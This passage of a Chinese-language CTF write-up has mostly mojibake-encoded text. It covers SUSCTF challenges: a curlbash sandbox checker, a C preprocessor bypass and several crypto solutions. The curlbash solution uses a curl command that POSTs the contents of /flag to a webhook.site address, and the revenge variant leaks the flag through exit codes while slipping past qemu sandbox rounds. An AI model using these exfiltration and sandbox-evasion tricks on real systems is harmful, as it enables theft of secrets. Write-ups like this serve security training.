&quot;rb&quot;) as f:        while chunk := f.read(8192):            h.update(chunk)    return h.hexdigest()def snapshot_directory(*paths):    file_hashes = &#123;&#125;    for path in paths:        for root, dirs, files in os.walk(path):            for f in files:                full_path = os.path.join(root, f)                try:                    file_hashes[full_path] = hash_file(full_path)                except Exception:                    pass    return file_hashesdef fetch(url):    result = requests.get(url)    result.raise_for_status()    return result.textdef fetch_with_curl(url):    result = subprocess.run([&quot;curl&quot;, &quot;-fsSL&quot;, url], capture_output=True, text=True)    if result.returncode != 0:        print(&quot;Failed to download script!&quot;)        exit(1)    return result.stdoutdef write_script_to_chroot(script_path, script_content):    content = &quot;readonly LD_PRELOAD\\n&quot; + script_content    script_file = os.path.join(ROOT, script_path)    with open(script_file, &quot;w&quot;) as f:        f.write(content)    os.chmod(script_file, 0o755)def run_bash_script(script_path, sandbox=True):    script_path = os.path.join(ROOT, script_path)    sandbox_cmd = [&quot;/bin/bash&quot;, &quot;-re&quot;, script_path]    if sandbox:        # qemu-x86_64 is a safe sandbox with isolated network &amp; filesystem        # try locally with &quot;unshare -n&quot;        sandbox_cmd.insert(0, &quot;qemu-x86_64&quot;)    result = subprocess.run(sandbox_cmd, capture_output=True, text=True)    # print(&quot;Script stdout:&quot;, result.stdout)    # print(&quot;Script stderr:&quot;, result.stderr)    print(&quot;Exit code:&quot;, result.returncode)    if result.returncode != 0:        print(&quot;Ah-oh exit code. You fail!&quot;)        exit(1)def run_sandboxed(url):    # fetch first    s = fetch_with_curl(url)    if s != fetch(url):        print(&quot;WTH did you give me?&quot;)        exit(1)    write_script_to_chroot(TEST_SCRIPT_PATH, s)    # Snapshot root filesystem before running script    root_snapshot_before = snapshot_directory(ROOT, &quot;/tmp&quot;, &quot;/dev/shm&quot;)    # Run script sandboxed    run_bash_script(TEST_SCRIPT_PATH)    # Snapshot root filesystem after running script    root_snapshot_after = snapshot_directory(ROOT, &quot;/tmp&quot;, &quot;/dev/shm&quot;)    # Compare snapshots for any changes    changed_files = []    for fpath, hsh in root_snapshot_before.items():        if fpath in root_snapshot_after:            if root_snapshot_after[fpath] != hsh:                changed_files.append(fpath)        else:            changed_files.append(fpath + &quot; (deleted)&quot;)    new_files = [f for f in root_snapshot_after if f not in root_snapshot_before]    if not changed_files and not new_files:        print(&quot;No disk files were modified by the script. Good!&quot;)    else:        print(f&quot;Files changed: &#123;changed_files&#125;&quot;)        print(f&quot;New files: &#123;new_files&#125;&quot;)        print(&quot;Some disk files were modified. You fail.&quot;)        exit(1)def run_curlbash(url):    write_script_to_chroot(TEST_SCRIPT_PATH, CURLBASH.format(url=url))    run_bash_script(TEST_SCRIPT_PATH, sandbox=False)def main():    url = input(&quot;Your script: &quot;)    # Run random times in sandbox (to make sure you are not spoofing)    random_index = int.from_bytes(os.urandom(1), &quot;big&quot;) % 32    for i in range(random_index):        print(f&quot;[Round &#123;i&#125;]&quot;, end=&quot; &quot;)        run_sandboxed(url)    # Since the content is safe, do it in curlbash this time    print(f&quot;[Round &#123;random_index&#125; CURLBASH]&quot;, end=&quot; &quot;)    run_curlbash(url)if __name__ == &quot;__main__&quot;:    main()\nä¸ä¸Šä¸€é¢˜ç±»ä¼¼ï¼Œä½†æ˜¯è¿™ä¸ªç¯å¢ƒç»•ä¸è¿‡äº†ï¼Œä¸€å®šä¼šå…ˆåœ¨qemuä¸­è¿è¡Œè‹¥å¹²ä¸ªå›åˆï¼Œæ‰ä¼šåœ¨å®¿ä¸»æœºè¿è¡Œä¸€å›ã€‚åŒæ—¶ï¼Œæ²¡æœ‰è¾“å‡ºæµå’Œé”™è¯¯æµï¼Œåªä¿ç•™äº†é€€å‡ºä»£ç çš„è¾“å‡ºï¼Œå› æ­¤ï¼Œè™½ç„¶cat /flagå¯ä»¥ç›´æ¥è¿è¡Œäº†ï¼Œä½†æ˜¯å¾—ä¸åˆ°è¾“å‡ºï¼Œæ²¡æœ‰ç”¨ã€‚\nè¿™é¢˜è¢«æˆ‘å‘ç°äº†æ¼æ´ï¼Œå®ç°äº†ä¸€ä¸ªéé¢„æœŸã€‚è‡³äºé¢„æœŸè§£ï¼Œå‡ºé¢˜äººè¯´è¿™é¢˜åºŸäº†ï¼Œæ²¡æœ‰é¢„æœŸè§£ï¼Œæ‰€ä»¥revengeé‡Œé¢æˆ‘ä¹Ÿåªèƒ½æä¾›æˆ‘çš„è§£æ³•ã€‚\nç¬¬ä¸€æ­¥ï¼Œç¨‹åºå…ˆæ£€æµ‹curlè·å–çš„è„šæœ¬å’Œrequestè·å–çš„æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸ä¸€è‡´åˆ™ç›´æ¥æŠ¥é”™ã€‚è€ƒè™‘åˆ°requeståº“å’Œcurlå®ç°ä¸Šçš„å·®å¼‚ï¼Œå»ºè®®å°†è„šæœ¬ç¼–æˆä¸€è¡Œã€‚\nç¬¬äºŒæ­¥ï¼Œç”±äºå›æ˜¾åªæœ‰é€€å‡ºä»£ç ï¼Œå¿…é¡»é‡‡ç”¨å…¶ä»–æ–¹å¼è¾“å‡ºï¼Œå¦‚æœè€ƒè™‘ä½¿ç”¨ç½‘ç»œä¼ è¾“ï¼Œqemuæ²¡æœ‰ç½‘ï¼Œå¿…é¡»ç”±å®¿ä¸»æœºæ‰§è¡Œå‘½ä»¤ï¼Œè€Œåœ¨qemuåº”å½“ç»•è¿‡ã€‚\nå› æ­¤ï¼Œæˆ‘ä»¬åˆ©ç”¨webhook.siteæ¥æ”¶æœåŠ¡å™¨å›ä¼ çš„flagï¼Œå¹¶ä½¿ç”¨||exit 0ç»•è¿‡qemuçš„æŠ¥é”™ã€‚å®Œæ•´è„šæœ¬å¦‚ä¸‹ï¼šcurl -X POST --data &quot;$(cat /flag)&quot; &quot;https://webhook.site/your_address&quot; || exit 0\nåŒæ ·ä¸Šä¼ åˆ°pastebinï¼Œå‘é€è‡³æœåŠ¡å™¨å³å¯é€šè¿‡æ¯ä¸€è½®qemuä¸­çš„éªŒè¯ï¼Œè®©å®¿ä¸»æœºå‘å‡ºflagã€‚\ncurlbash-revengeåœ¨å’Œå‡ºé¢˜äººäº¤æµè¿‡åä»–ä»¬æˆåŠŸæ ¹æ®æˆ‘çš„æ€è·¯éƒ¨ç½²äº†ååˆ¶æªæ–½ï¼Œç°åœ¨ä½¿ç”¨||exit 0ä¸é¡¶ç”¨äº†ã€‚ä½†æ˜¯é€€å‡ºä»£ç è¿˜æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œå°è¯•äº†exit 1å’Œexit 123456ç­‰å¤šè½®æµ‹è¯•åï¼Œå‘ç°é€€å‡ºä»£ç å¯ä»¥æ˜¯0-255ï¼Œåœ¨exit 256æ—¶å°±ä¼šå›åˆ°exit 0ã€‚è¿™ä¸ªèŒƒå›´è¶³å¤Ÿå¤§ï¼Œå¯ä»¥è¦†ç›–æ‰€æœ‰å¯æ‰“å°å­—ç¬¦ï¼Œå› æ­¤æˆ‘ä»¬åˆ©ç”¨é€€å‡ºä»£ç è¿›è¡Œå›æ˜¾ï¼Œä¸æ–­è¯·æ±‚æœåŠ¡å™¨ï¼Œè®©å…¶ç»™å‡ºflagçš„æ¯ä¸€ä½ã€‚\nif test -f /flag; then char=$(cut -c 57 /flag); case &quot;$char&quot; in &#x27;&#x27;) exit 0;; &#x27;a&#x27;) exit 10;; &#x27;b&#x27;) exit 11;; &#x27;c&#x27;) exit 12;; &#x27;d&#x27;) exit 13;; &#x27;e&#x27;) exit 14;; &#x27;f&#x27;) exit 15;; &#x27;g&#x27;) exit 16;; &#x27;h&#x27;) exit 17;; &#x27;i&#x27;) exit 18;; &#x27;j&#x27;) exit 19;; &#x27;k&#x27;) exit 20;; &#x27;l&#x27;) exit 21;; &#x27;m&#x27;) exit 22;; &#x27;n&#x27;) exit 23;; &#x27;o&#x27;) exit 24;; &#x27;p&#x27;) exit 25;; &#x27;q&#x27;) exit 26;; &#x27;r&#x27;) exit 27;; &#x27;s&#x27;) exit 28;; &#x27;t&#x27;) exit 29;; &#x27;u&#x27;) exit 30;; &#x27;v&#x27;) exit 31;; &#x27;w&#x27;) exit 32;; &#x27;x&#x27;) exit 33;; &#x27;y&#x27;) exit 34;; &#x27;z&#x27;) exit 35;; &#x27;A&#x27;) exit 36;; &#x27;B&#x27;) exit 37;; &#x27;C&#x27;) exit 38;; &#x27;D&#x27;) exit 39;; &#x27;E&#x27;) exit 40;; &#x27;F&#x27;) exit 41;; &#x27;G&#x27;) exit 42;; &#x27;H&#x27;) exit 43;; &#x27;I&#x27;) exit 44;; &#x27;J&#x27;) exit 45;; &#x27;K&#x27;) exit 46;; &#x27;L&#x27;) exit 47;; &#x27;M&#x27;) exit 48;; &#x27;N&#x27;) exit 49;; &#x27;O&#x27;) exit 50;; &#x27;P&#x27;) exit 51;; &#x27;Q&#x27;) exit 52;; &#x27;R&#x27;) exit 53;; &#x27;S&#x27;) exit 54;; &#x27;T&#x27;) exit 55;; &#x27;U&#x27;) exit 56;; &#x27;V&#x27;) exit 57;; &#x27;W&#x27;) exit 58;; &#x27;X&#x27;) exit 59;; &#x27;Y&#x27;) exit 60;; &#x27;Z&#x27;) exit 61;; &#x27;0&#x27;) exit 62;; &#x27;1&#x27;) exit 63;; &#x27;2&#x27;) exit 64;; &#x27;3&#x27;) exit 65;; &#x27;4&#x27;) exit 66;; &#x27;5&#x27;) exit 67;; &#x27;6&#x27;) exit 68;; &#x27;7&#x27;) exit 69;; &#x27;8&#x27;) exit 70;; &#x27;9&#x27;) exit 71;; &#x27;_&#x27;) exit 72;; &#x27;-&#x27;) exit 73;; &#x27;+&#x27;) exit 74;; &#x27;=&#x27;) exit 75;; &#x27;&#123;&#x27;) exit 76;; &#x27;&#125;&#x27;) exit 77;; &#x27;[&#x27;) exit 78;; &#x27;]&#x27;) exit 79;; &#x27;(&#x27;) exit 80;; &#x27;)&#x27;) exit 81;; &#x27;*&#x27;) exit 82;; &#x27;&amp;&#x27;) exit 83;; &#x27;^&#x27;) exit 84;; &#x27;%&#x27;) exit 85;; &#x27;$&#x27;) exit 86;; &#x27;#&#x27;) exit 87;; &#x27;@&#x27;) exit 88;; &#x27;!&#x27;) exit 89;; &#x27;~&#x27;) exit 90;; &#x27;|&#x27;) exit 91;; &#x27;:&#x27;) exit 92;; &#x27;;&#x27;) exit 93;; &#x27;,&#x27;) exit 94;; &#x27;.&#x27;) exit 95;; &#x27;/&#x27;) exit 96;; &#x27;&lt;&#x27;) exit 97;; &#x27;&gt;&#x27;) exit 98;; &#x27;?&#x27;) exit 99;; &#x27;\\&#x27;) exit 100;; &quot;&#x27;&quot;) exit 101;; &#x27;&quot;&#x27;) exit 102;; *) exit 3;; esac; fi\nä¸ºäº†é˜²æ­¢qemuä¸­æ²¡æœ‰/flagå¯¼è‡´ä»£ç ä¸èƒ½å·¥ä½œï¼Œæœ€å‰é¢æœ‰ifè¯­å¥è¿›è¡Œæ’é™¤ã€‚ä»£ç ä¸»è¦é€šè¿‡cut -c xx /flagéƒ¨åˆ†æå–å‡º/flagçš„æ¯ä¸€ä½ï¼Œå¹¶ä¸æ‰€æœ‰å¯æ‰“å°å­—ç¬¦è¿›è¡Œæ¯”å¯¹ï¼Œæ ¹æ®é”™è¯¯ç å¾—åˆ°å¯¹åº”ä½ç½®çš„ä¿¡æ¯ã€‚\nä»¥åŠéå¸¸éš¾è¿‡çš„æ˜¯ï¼Œqemuä¸­ä¹Ÿæœ‰/flagï¼Œä½†æ˜¯å†…å®¹æ˜¯susctf&#123;fake_flag&#125;ï¼Œä¸ºäº†é¿å…è¯»åˆ°qemuä¸­çš„æ–‡ä»¶å°±æŠ¥é”™ï¼Œéœ€è¦å°†æ¯ä¸€ä½å¯¹åº”çš„exit xxä¿®æ”¹ä¸º0ã€‚ç”±äºåŸå§‹ä»£ç æ²¡æœ‰è¿”å›0çš„åˆ†æ”¯ï¼Œè¿™ä¸ªä¸´æ—¶çš„0ä¸ä¼šå’Œå…¶ä»–å­—ç¬¦æ··æ·†ã€‚ç»è¿‡å‹¤åŠ³çš„éå†ï¼Œflagä¸€å…±æœ‰57ä½ï¼Œä¸å¾—ä¸è¯´è¿™ä¸ªæ–¹æ³•è¿˜æ˜¯æœ‰äº›ä½æ•ˆçš„ã€‚\nèµ›åä¸å…¶ä»–å¸ˆå‚…äº¤æµï¼Œå…¶å®ä¸Šé¢å‘é€flagçš„æ€è·¯ä¹Ÿå¯ä»¥ç»§ç»­ç”¨ï¼Œlaboonå¸ˆå‚…æå‡ºå¯ä»¥è®©ä»£ç åˆ¤æ–­è‡ªèº«åœ¨qemuè¿è¡Œè¿˜æ˜¯åœ¨å®¿ä¸»æœºè¿è¡Œï¼Œåœ¨å®¿ä¸»æœºè¿è¡Œæ‰å‘é€ï¼Œè¿™æ ·æ¯”æˆ‘æ­¤å‰ç®€å•åœ°|| exit 0åº”è¯¥æ›´å¥å£®ï¼Œå—ç›ŠåŒªæµ…ã€‚\n\nï¼ˆæ­¤å¤„ä¸ºæœ€åä¸€ä½ï¼Œè¿”å›ä»£ç 77å¯¹åº”çš„æ˜¯â€™}â€™ï¼‰\neat-mianåˆæ˜¯ä¸€ä¸ªOJå•Šå•Šå•Šå•Šï¼Œå»å¹´ä»…1è§£çš„OJ (Orange Juice)è¿˜å†å†åœ¨ç›®ï¼Œä»Šå¹´æ¡†æ¶éƒ½æ²¡å˜ï¼Œäºæ˜¯è‡´æ•¬ä¸€ä¸‹å»å¹´çš„æ­£è§£â€”â€”\n\nä½†æ˜¯ä»Šå¹´çš„æˆ‘(AI)æ—©å°±ä¸æ˜¯å»å¹´çš„æˆ‘(AI)äº†ï¼Œç›´æ¥æŠŠé¢˜ç›®æè¿°ä¸¢ç»™Geminiï¼Œå®ƒå°±ä¼šå‘Šè¯‰æˆ‘ï¼Œåœ¨é¢„ç¼–è¯‘é˜¶æ®µï¼Œæœ‰ä¸€ä¸ªâ€œç¬¦å·è¿æ¥â€çš„æ“ä½œç¬¦##ï¼Œå¯ä»¥ç»•å¼€ä¸å…è®¸å‡ºç°intå’Œmainçš„é™åˆ¶ã€‚\n\nå°†å˜åŒ–åçš„ä»£ç ç”¨#defineå˜å›å»å°±å¯ä»¥å¾—åˆ°flagäº†â€”â€”æˆ‘ä»¬ä»æœªçŸ¥é“flagè¢«å­˜æ”¾åœ¨äº†å“ªé‡Œã€‚\nsigninç­¾åˆ°é¢˜ï¼Œå¤§æ¦‚æ˜¯æˆ‘ä»¬æµ·æŠ¥çš„åŸç¨¿ï¼ŒåŠ äº†ç‚¹ä¸œè¥¿å°±æ˜¯miscé¢˜äº†ï¼Œé¢˜å°±æ˜¯è¿™ä¹ˆå¥½å‡ºï¼ˆÃ—ï¼‰\n\nåœ¨ä¸€å †ç°ç™½çš„å­—ä¸­æœ‰ä¸€ä¸ªsusctfå¼€å¤´çš„é€æ˜å­—ï¼Œé¼ æ ‡æ‰’æ‹‰æ‰’æ‹‰å°±èƒ½çœ‹åˆ°äº†ï¼Œå”¯ä¸€éš¾ç‚¹åº”è¯¥æ˜¯.aiæ–‡ä»¶å’Œäººå·¥æ™ºèƒ½æ²¡å…³ç³»ï¼ˆï¼‰å®ƒæ˜¯Adobe Illustratorçš„æ–‡ä»¶æ ¼å¼ã€‚ç¾å·¥äººç‹‚å–œï¼Œç”µè„‘é‡Œæœ¬æ¥å°±æœ‰AI\nCryptoä»£ç åŸºæœ¬éƒ½æ˜¯AIå†™çš„ï¼Œæˆ‘åªèƒ½å¤§è‡´æ˜ç™½æ€è·¯â€¦â€¦å…¶å®ä¸èƒ½å®Œå…¨çœ‹æ‡‚ï¼Œæ‰€ä»¥ä¹Ÿä¸ä¼šç¼©å‡ï¼Œå¯¼è‡´æ¯é“é¢˜éƒ½ç‰¹åˆ«é•¿ã€‚\n01-All U Needn=2941187500626100000000000000000096722058862370000000000000000001044274909577110000000000000000015573575404024600000000000000000171146406712341000000000000000001930245944570620000000000000000025760100923677100000000000000000277371363421722000000000000000003054750478471270000000000000000035899269818100000000000000000000349504486312827000000000000000004416107975113120000000000000000045159437561331900000000000000000478278579950862000000000000000005201068719280110000000000000000055395991229465600000000000000000575427264362311000000000000000006513899157891840000000000000000068138580040670900000000000000000700010100085102000000000000000007449678280649610000000000000000076179301616911000000000000000000848825344827111000000000000000009147528156886200000000000000000096916670048442100000000000000001012695491123924000000000000000010191376824152950000000000000000101921523818312200000000000000001090906528164867000000000000000010818660687278780000000000000000114494912265499100000000000000001164939172364714000000000000000012240810178674610000000000000000116157458128710400000000000000001133872977471815000000000000000010558262104734340000000000000000103419184748331500000000000000001044264742306912000000000000000010186125008047950000000000000000095524362764015000000000000000000925195844257991000000000000000008524721514180660000000000000000084244161241166500000000000000000830468755024986000000000000000007624760085725490000000000000000076981945972714200000000000000000747851012643443000000000000000006794764467668420000000000000000062532460088466500000000000000000579998461987310000000000000000005544771313728490000000000000000050476404913277600000000000000000526223490724127000000000000000004716072135866840000000000000000044222349447237500000000000000000388984855995114000000000000000002999863906983770000000000000000021959129120257200000000000000000237144904003813000000000000000001758831932677180000000000000000018600782750857900000000000000000139537141588822000000000000000001041336657419230000000000000000008113148344575000000000000000000043849510632891e=2906394483919609876718245053652108240802816443654616570596682960056808336790951023665436900644365903659469395107610861811395487908359598931024764867783668598175618146070568166725395945846336528660593938878088074175368940125303446833806253827725576660603146160007926077633080070185804184370653460670499542474209926140850959830662928147081534504640452680743596927639143202106763011511633450412304911872611149284691203494590753332817447973304563995049156481955538016229735794657638604187642026395729393683809232249697844705933283010120794860594266302003916077635513753570820267039903372227762924194963229903775950600612826173365742947144845754327033303700968593908029325991574729319864162867114383090257406360462274758239372652598322110514768234833067030343517976067981681173246285960999251392023910101008419622061741537702746089074868280716357218504600102619616790459363850662290927928570978665465006400532967886379285182577029c=1190448896576674940169048021542568876629909531547690337039288304071116517850672930275366650914788738523635400087439794697320193379914283478921046792067380001414422110093896680403233706041303960499131571084467446744999531531238620915097878236247448563831816076306299266035411290150464451023521946205795799354077689961093204938124787700627137419587910048439692092060991755536424004878133971657053976625603120880490296023782934147849283336384914990141478789471814729184461237469197189114789972562528627795460661045750637448777265275745160713213791683125719306305168709528434878911135471708890268514739189191172559780945596969438601249588555828273347231242560315367718701130952384338051421732999545936059615621501082989575038641220752655741481616002525984081159278879228707270270048788115219379286441398718927616251267986055410142929308050949237931470194218235086747829680939134194106609480707821530668734725940583875631572810960405382694202794384758973969371841409095403097239053549145811053655553996580027708162577179836737117804481940071579653530986075446713256609731230452515686744161134570917712426703991303881001809142572894366883152499870798084538057692204061499100319663916097876614420422576451205125566725055522179037976985019454442424976083632133838833052855738943311351865444660669168591183064653092902121387259300362312466635003594662015601785113887435152765095740855037847111077201694022411838750953848736275821057278487436910657182007150097552289728182766615426847673040720530121660328091282786112392059093980484132511041841724717003899521390308002340216451362913612975425331475263200293326298200724869940602306097253562653741627568455743020479638958773380775489285049262071657097962137786887285544908361861408838935682843240487589708181360394439544072953558605639364102922606931988705631690500269025028799190709417306264422259731384834550871432097000879514617465537308146352338219622159288357654855036297562761852070891002197541993195834291283267903740056270247342537234029389986639757219003301227959585640924085165689420265659085787058337920332842168\nå¥½ä¹…æ²¡è§åˆ°è¿™ç§åˆçŸ­åˆé•¿çš„é¢˜äº†ï¼Œä¿¡æ¯å¾ˆå°‘åˆå¾ˆé•¿ï¼Œå°¤å…¶æ˜¯è¿™ä¸ªnï¼Œå®åœ¨æ˜¯å¾ˆéš¾ä¸åœ¨æ„å•Šã€‚\nä½†æ˜¯é¢˜è§£å°±å¾ˆéš¾å†™äº†ï¼Œå› ä¸ºåªèƒ½æ˜¯â€œæ³¨æ„åˆ°â€èµ·æ‰‹â€¦â€¦nç”±å°æ•°å­—å’Œä¸€äº›0äº¤æ›¿ï¼Œå› æ­¤å¯ä»¥è¯•ç€å°†nè½¬åŒ–ä¸ºä¸€ä¸ªå¤šé¡¹å¼fï¼ŒæŠŠåˆ†è§£nçš„é—®é¢˜è½¬åŒ–ä¸ºåˆ†è§£å¤šé¡¹å¼ã€‚ç»è¿‡è§‚å¯Ÿï¼Œä»æœ€ä½ä½å¼€å§‹ï¼Œæ¯32ä¸ªæ•°å­—ä¸ºä¸€ç»„ï¼Œåˆšå¥½å¯ä»¥è®©æ‰€æœ‰å°æ•°å­—éƒ½è½åœ¨ä½ä½ã€‚\n2941187500626100000000000000000096722058862370000000000000000001044274909577110000000000000000015573575404024600000000000000000171146406712341000000000000000001930245944570620000000000000000025760100923677100000000000000000277371363421722000000000000000003054750478471270000000000000000035899269818100000000000000000000349504486312827......å…ˆå¼ºè¡Œå°†æ‰€æœ‰0æ”¾åœ¨é«˜ä½\n294118750062610000000000000000009672205886237000000000000000000104427490957711000000000000000001557357540402460000000000000000017114640671234100000000000000000193024594457062000000000000000002576010092367710000000000000000027737136342172200000000000000000305475047847127000000000000000003589926981810000000000000000000034950448631282700000000000000000441610797511312......å°±ä¼šå‘ç°ç¨å¾®è°ƒæ•´ä¸€ä¸‹ï¼Œä¼šå¾ˆæ•´é½\nè¿™æ ·ï¼Œæˆ‘ä»¬å°±å¾—åˆ°äº†æ‰€æœ‰çš„å°ç³»æ•°ã€‚ç”±äºæ•°å­—æ˜¯32ä½ä¸€ç»„ï¼Œå› æ­¤å¤šé¡¹å¼$f(x) = 29411875006261x^{64}+96722058862370x^{63}+â€¦$ï¼Œ$n = f(10^{32})$ã€‚\næˆ‘ä»¬è¯•ç€åˆ†è§£$f(x)$ã€‚ç”±äºæˆ‘çš„sagemathä¸´æ—¶ç½¢å·¥äº†ï¼Œç”¨Mathematicaä»£æ›¿ä¸€ä¸‹ï¼Œä»£ç å½“ç„¶è¿˜æ˜¯Geminiå†™çš„ã€‚\n(*---æ­¥éª¤ 1:å®šä¹‰å¤šé¡¹å¼çš„ç³»æ•°---*)(*æ ¹æ®æ‚¨æä¾›çš„æ•°æ®ï¼Œä»æœ€é«˜æ¬¡é¡¹ (x^64) åˆ°å¸¸æ•°é¡¹ (x^0) çš„é¡ºåº*)coeffs = &#123;29411875006261, 96722058862370, 104427490957711,  155735754040246, 171146406712341, 193024594457062, 257601009236771, 277371363421722, 305475047847127, 358992698181000, 349504486312827, 441610797511312, 451594375613319, 478278579950862, 520106871928011, 553959912294656, 575427264362311, 651389915789184, 681385800406709, 700010100085102, 744967828064961, 761793016169110, 848825344827111, 914752815688620, 969166700484421, 1012695491123924, 1019137682415295, 1019215238183122, 1090906528164867, 1081866068727878, 1144949122654991, 1164939172364714, 1224081017867461, 1161574581287104, 1133872977471815, 1055826210473434, 1034191847483315, 1044264742306912, 1018612500804795, 955243627640150, 925195844257991, 852472151418066, 842441612411665, 830468755024986, 762476008572549, 769819459727142, 747851012643443, 679476446766842, 625324600884665, 579998461987310, 554477131372849, 504764049132776, 526223490724127, 471607213586684, 442223494472375, 388984855995114, 299986390698377, 219591291202572, 237144904003813, 175883193267718, 186007827508579, 139537141588822, 104133665741923, 81131483445750, 43849510632891&#125;;(*---æ­¥éª¤ 2:ä»ç³»æ•°æ„å»ºå¤šé¡¹å¼---*)(*ä½¿ç”¨ FromDigits å‡½æ•°ï¼Œè¿™æ˜¯ä¸€ç§éå¸¸é«˜æ•ˆä¸”ä¼˜é›…çš„æ–¹å¼*)(*P[x] ä»£è¡¨æˆ‘ä»¬çš„å¤šé¡¹å¼*)P[x_] := FromDigits[coeffs, x];(*---æ­¥éª¤ 3:å°è¯•å¯¹å¤šé¡¹å¼è¿›è¡Œå› å¼åˆ†è§£---*)(*Factor[] æ˜¯ Mathematica ä¸­ç”¨äºå› å¼åˆ†è§£çš„æ ¸å¿ƒå‡½æ•°*)(*æˆ‘ä»¬ä½¿ç”¨ Timing[] æ¥æµ‹é‡è®¡ç®—æ‰€éœ€çš„æ—¶é—´*)Print[&quot;æ­£åœ¨å°è¯•åˆ†è§£å¤šé¡¹å¼...&quot;];result = Timing[Factor[P[x]]];(*---æ­¥éª¤ 4:æ˜¾ç¤ºç»“æœ---*)Print[&quot;è®¡ç®—è€—æ—¶: &quot;, result[[1]], &quot; ç§’&quot;];Print[&quot;åˆ†è§£ç»“æœ:&quot;];result[[2]]####################################################åˆ†è§£ç»“æœï¼š(6406713 + 9553797 x + 5845799 x^2 + 4190775 x^3 + 7190749 x^4 +    2115569 x^5 + 8795931 x^6 + 4833343 x^7 + 6591197 x^8 +    8995631 x^9 + 9256951 x^10 + 5850379 x^11 + 7268673 x^12 +    4965579 x^13 + 9424191 x^14 + 6285533 x^15 + 6849663 x^16 +    4159993 x^17 + 7073919 x^18 + 6515847 x^19 + 3318105 x^20 +    8434387 x^21 + 3595731 x^22 + 5727693 x^23 + 3780489 x^24 +    3377355 x^25 + 6632605 x^26 + 4820231 x^27 + 5152863 x^28 +    6497639 x^29 + 2353095 x^30 + 7461845 x^31 +    2997863 x^32) (6844307 + 2457167 x + 6344587 x^2 + 5599625 x^3 +    5604721 x^4 + 4817655 x^5 + 3724917 x^6 + 3741569 x^7 +    8948705 x^8 + 9649919 x^9 + 6464695 x^10 + 8570943 x^11 +    4311675 x^12 + 3772115 x^13 + 2850975 x^14 + 5503773 x^15 +    6502209 x^16 + 4529349 x^17 + 9430051 x^18 + 2652377 x^19 +    7055707 x^20 + 6603971 x^21 + 5023657 x^22 + 4761113 x^23 +    9674989 x^24 + 7834229 x^25 + 9056537 x^26 + 5921159 x^27 +    3346885 x^28 + 5586621 x^29 + 7609767 x^30 + 7843685 x^31 +    9810947 x^32)\næˆ‘ä»¬æˆåŠŸå¾—åˆ°äº†ä¸¤ä¸ªå¤šé¡¹å¼$f_1(x)$å’Œ$f_2(x)$ï¼Œå¥½å·§ä¸å·§ï¼Œ$f_1(10^{32})$å’Œ$f_2(10^{32})$éƒ½æ˜¯è´¨æ•°ï¼Œå› æ­¤æˆ‘ä»¬åˆ†è§£äº†nï¼Œè§£å¯†å³å¯ã€‚\n03-CrySigninfrom Crypto.Util.number import *from random import *from secret import flagfrom uuid import UUIDp=1329596764371107264260948790524463667078201288962092988229220331099216972202747986235496117149730240332402358728798174199576808159410988077039863933883707283021432596510812652195899704038126374630854432891580277457310166342238907250055728526757955693768208634626765002269557414142205735568171344541059676587026552819564587252379527557854007769644766922798602628730499830452043996042865583066303024746135216694290599886977846557408057361447210602309239731866416103q=664798382185553632130474395262231833539100644481046494114610165549608486101373993117748058574865120166201179364399087099788404079705494038519931966941853641510716298255406326097949852019063187315427216445790138728655083171119453625027864263378977846884104317313382501134778707071102867784085672270529838293513276409782293626189763778927003884822383461399301314365249915226021998021432791533151512373067608347145299943488923278704028680723605301154619865933208051g=25a=randint(3,q-3)for i in range(64):    print(f&#x27;g**(a**&#123;i&#125;)=&#x27;,pow(g,pow(a,i,q),p))f=[randint(3,2**64) for i in range(64)]f[-1]=1fa=0for i in range(64):    fa+=f[i]*pow(a,i,q)%q    fa%=qw=Nonewhile(1):    w=(a+randint(1,q-3))%q    fw=0    for i in range(64):        fw+=f[i]*pow(w,i,q)%q        fw%=q    if(fw):        breakprint(&#x27;f(x)=&#x27;,f)print(&#x27;w=&#x27;,w)print(&#x27;g**(f(a)/(a-w))=&#x27;,pow(g,fa*inverse(a-w,q)%q,p))ANS=pow(g,inverse(a-w,q),p)assert flag==UUID(int=ANS%(2**128))g**(a**0)=25g**(a**1)=138938326329179400579822016861807890152275074052840869513178308442184614752726120794416996726235976129066536780257951537294214323525744969193051509674913741655936382939560999371937428647227336441478465798890891062736322598096346789587118280691486460734758887983260464749333206460021943840739578350204147103615583489429115089997354280178128521599002756786009558249615543759588662110140611646864968779226557132212203458417777184738733482848882652085549811551602750g**(a**2)=787242680703317896225880146578899407317783685008557088960993271481180806579428103064499287971835456370143086063238834791281488271908565121959876237815137682291438451585392821959182203153952321850488871696249587091275651387749479343541532108538357276743401318874969015308527859124376021967975622821288578616875205643710915492778876302534307435227858368811523837684138429580961487399817275903793072214671870100074361675867713122425039930968169456426224190491953655g**(a**3)=144053098067532353457701263379018029159819405496313032361731100252808677300037594667717604007886994334286240396566616626417869616604735249087405267941399853418980301181784794799665920203944311242182713872848453715903353619836502204307521046376274382668297403970708073470753160669701406222697334410467095349085385834932894698432058219959381247293124349268105037433085064906493404792415974031154576497249517512300273267920211401125961100561349245540430964789566962g**(a**4)=1258283244540705640498370512549369272497759742687770775728445735610256099647963023219206198082844942039795483050517009475460920677130670702262878182764961225691181819950973298014325033285604446246570212537835833328036809084339501666549608883654964216130250136698819785388170383783688423703728628205438056573678688538255463710397183023609344381131437248797151751897323088390679334027568249454799880276098520377449297979456908718948532884554110592433722383380062961g**(a**5)=629309690740656243532031635869513308880882274755363632031775311594862331794917515786804640776328409747791116700422814850907010485408047898313819954957504870912477171640565677629456742035021002894606231207255454189349531116042032571381195039263749866811008298040015980000487056571330823197166794627491035204994348940484118445084146500779527088939245040992117880712235921399823971437063023111164755209393997153476709195008441498580411236989092287439776068463202779g**(a**6)=1319779784607766944815219914844081068633769619625827522691222490804143713770021950470156766039484581701210577515002761263702966299361414770543481566258540531284009229162055052932042660761378575759635514838550246026448157919388420589152622236767994965597066371062620040591764464255409007622768927702888592446626272345389220975925028180652817387831098191499013117163277910726876822580240489844771663828224254857422979352504668285213385603519950350940669222938328784g**(a**7)=301262423147272555037432733134804338497424717157843894351639480970154471771867772336801209570415364401267675498479113511682664665340243738981791343635945430027479298094403364432688326523732042778759417426838991683273500756618824584421826862527003789243056307239870418674621467687054397524808305085151395436427026986050975972569331291664826047862809080432239084942767671828279358174547249239067042751478384152001204529458729243518909488188289028306944798939401392g**(a**8)=78604973335771004563027532081570195617276994910147356460069421329539320573667743484772023145262407386428332319620094283067192192520811482262629209402350781370286391646308081816107743741740677556506724291912924226376808780714347167252275594619248474697283994990879146270032444153898949101155107826769173117605315